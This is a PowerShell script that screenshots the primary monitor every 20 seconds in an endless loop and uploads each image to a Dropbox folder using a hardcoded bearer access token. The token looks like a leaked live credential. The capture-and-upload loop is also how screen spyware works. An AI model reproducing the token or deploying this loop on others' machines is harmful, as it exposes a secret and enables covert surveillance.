$AccessToken = "sl.u.AGJnIkSvgZ946orS1LXXa06X-qNZRXvj8xzUmfkzarVqqEetvp510yYNAVcppwnHIIEALttoVQn-UZWnvCyLz24vc4k7p51ILlRt6DaxS5T1zgxMUJtoTKE_fnefJeL_QqzzFfsjH002jb6S3HsY9GFkS0G48A-8CuZE8fIp8ocnf6j59O8Iu-UZ3DYJs_97B7XjVkOt8zYg6KxXDuXl6ijx6v3_2-RZ0m6PfC3oCDI8eALe_giANvcUS5sv0V0MmmB9T0PptyPrZqqeN5hvwAXG3UK612uIRledEkmuvZsK5bgIQBo48phImRMIw1iuVpI-_y1ySbNXuNzIHqiRW_MgUWUYyUUCpcZFJ34Arhtkv76-6k1-ZfZZ5bvPRpyy_A8z9DFE14cQc1zWMFXmc8FM9ijMSHVhoxa2Yl_4EoxpxDMWHmVtnQoyg-d02DV-P-gZLHV1RyUqT_LVUXgr4Pf1Zo13q9Zzpfe_NVMgjtHE07cuUs4fm415LSv7oAHAFLSm1_bWVNxn_dZg7wxaX_Wtu9a5ToEqSWKO51ggqzEDqfgih5LNc0ZDHNOFf3tbXfM7mLpa0SQnKhF-5haPd2XlFpf4gb0J4ZWIBdprHXoA2h0STPkyKufvtaVKmHmdWwzFZ2zeVZR6sC0h2slbJIXclJvwl7r5k-lkhu65A9LQKzNUqkjmUt6XN8m3WjKLIsn-9z5v2w8oI8ws4zM_IRlMDF9WQMwDq5_692KefccRQuMQ_2pgj8TV53mLRJrHyyRbVWwBtVBzdYGN3eIf8tf1NpMHDm-SWGkII84pw0bIGKVvQ0qIyoF_CbCfBBdtHNWAwDBpyy5GnM1NlDSaoXFua18i4XY4Bx5lVFL07iaUIP0nR_H2vSckZxd2HVMYOD70oRpqYAbhye0Un_RUDPtCxHEoCE4r3b-Po1l3CWMrV7OfTv4hqsWvzEVT1NcQPMDr32YIBZeKAQwLKNGF8JX6yrHKaykLW_fkLpS6e1pBGElNAHnp9P5wfP5ZHfETr8l5Av5FXq5pjSlVme1NUgaPU_vaaTLXXrMPpTY6SR0cTG5846aLPFkvyKjV2PJ9Q4EfFCxS2MdW_FyBJXJf2qWKuBSW61A3l0fGZBOTfYgh7Y41yP5XywB8_DGSXpbH_ZUB35vqfwoLdnEN0wEx-4zMXGsUARi1YSdNfhazWmkBvee-6IJT6n24GfwC0owGMgAit-lYn3ML-kiKs5gqm8IYbPZKG-0rSnesktqbPx_BDRFCSvG_HNa91nIx7lKvKRLcc6793BDB3mIWrTJztZuY"
$DropboxFolder = "/screenshot"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Write-Host "Script started. Capturing every 20 seconds..."

while ($true) {

    try {
        $timestamp = (Get-Date).ToString("yyyy-MM-dd_HH-mm-ss")
        $ImagePath = "$env:TEMP\screenshot_$timestamp.png"

        $Screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)

        $Graphics.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size)
        $Bitmap.Save($ImagePath, [System.Drawing.Imaging.ImageFormat]::Png)

        $Graphics.Dispose()
        $Bitmap.Dispose()

        Write-Host "Saved: $ImagePath"

        # Upload
        $DropboxPath = "$DropboxFolder/$timestamp.png"

        $Headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Dropbox-API-Arg" = "{""path"": ""$DropboxPath"", ""mode"": ""overwrite""}"
            "Content-Type"   = "application/octet-stream"
        }

        $FileBytes = [System.IO.File]::ReadAllBytes($ImagePath)
        $UploadUrl = "https://content.dropboxapi.com/2/files/upload"

        try {
            $response = Invoke-RestMethod -Uri $UploadUrl -Method Post -Headers $Headers -Body $FileBytes
            Write-Host "Uploaded: $($response.path_display)"
        }
        catch {
            Write-Host "UPLOAD ERROR:"
            Write-Host $_.Exception.Message
            Write-Host "DETAILS:" ($_.ErrorDetails | ConvertTo-Json -Depth 10)
        }

    }
    catch {
        Write-Host "GENERAL ERROR:"
        Write-Host $_.Exception.Message
    }

    Start-Sleep -Seconds 20
}
